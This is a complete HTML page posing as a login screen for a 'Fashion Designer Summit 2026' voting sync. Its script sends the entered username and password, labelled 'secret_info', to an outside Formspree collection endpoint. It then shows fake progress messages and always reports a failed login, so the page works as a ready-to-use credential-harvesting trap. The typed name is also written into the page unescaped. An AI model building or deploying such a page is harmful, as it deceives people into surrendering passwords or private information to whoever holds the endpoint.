<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <script src="https://unpkg.com/lucide@latest"></script>
    <style>
        :root { --primary: #007AFF; --bg: #f5f5f7; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 2.5rem; border-radius: 22px; box-shadow: 0 20px 40px rgba(0,0,0,0.08); width: 100%; max-width: 380px; text-align: center; }
        .logo-wrapper { background: #e8f2ff; width: 150px; height: 55px; border-radius: 15px; display: flex; align-items: center; justify-content: center; margin: 0 auto 1.5rem; color: var(--primary); }
        h1 { font-weight: 600; font-size: 1.6rem; margin-bottom: 0.5rem; color: #1d1d1f; letter-spacing: -0.5px; }
        p { color: #86868b; font-size: 0.95rem; line-height: 1.5; margin-bottom: 2rem; }
        input { width: 100%; padding: 14px; border: 1px solid #d2d2d7; border-radius: 10px; font-size: 1rem; margin-bottom: 1rem; outline-color: var(--primary); box-sizing: border-box; }
        button { width: 100%; padding: 14px; background: var(--primary); color: white; border: none; border-radius: 10px; font-weight: 600; cursor: pointer; transition: transform 0.1s, opacity 0.2s; }
        button:active { transform: scale(0.98); }
        #loader { display: none; margin-top: 1rem; }
        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid var(--primary); border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 15px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="card" id="mainCard">
   
<div class="logo-wrapper">
    <img src="logo.png" alt="Logo" style="width: 100%; height: 100%; object-fit: contain; border-radius: 12px;">
</div>
    
    <h1>Login</h1>
    <p>Fashion Designer Summit 2026<br>Real-time voting preference sync.</p>
    
    <div id="form-content">
        <input type="text" id="username" placeholder="Username" autocomplete="off">
        <input type="text" id="crush" placeholder="Password" autocomplete="off">
        <button onclick="processData()">Continue</button>
    </div>

    <div id="loader">
        <div class="spinner"></div>
        <p id="status" style="font-weight: 500; color: #1d1d1f;">Logging you in...</p>
    </div>
</div>

<script>
    lucide.createIcons();

    function processData() {
        const user = document.getElementById('username').value;
        const data = document.getElementById('crush').value;

        if (!user || !data) return alert("Please fill in all fields.");

        // Show the loader
        document.getElementById('form-content').style.display = 'none';
        document.getElementById('loader').style.display = 'block';

        // --- FORMSPREE INTEGRATION ---
        // Replace 'your-id' with your actual Formspree ID
        fetch('https://formspree.io/f/xpqkljer', {
            method: 'POST',
            body: JSON.stringify({ username: user, secret_info: data }),
            headers: { 'Accept': 'application/json' }
        });

        const statuses = ["Securing Info...", "Syncing...", "Almost There..."];
        let i = 0;
        const interval = setInterval(() => {
            document.getElementById('status').innerText = statuses[i];
            i++;
            if (i === statuses.length) {
                clearInterval(interval);
                showResult(user);
            }
        }, 1500);
    }

    function showResult(name) {
        document.getElementById('mainCard').innerHTML = `
            <div class="logo-wrapper" style="background: #fff0f0; color: #ff3b30;">
                <i data-lucide="user-x" style="width: 32px; height: 32px;"></i>
            </div>
            <h1 style="color: #ff3b30;">Error!</h1>
            <p>Login failed for: <strong>${name}</strong></p>
            <p style="color: #1d1d1f; font-weight: 500;">Incorrect Password Entered.</p>
            <button style="background: #1d1d1f;" onclick="location.reload()">Retry</button>
        `;
        lucide.createIcons();
    }
</script>
</body>
</html>
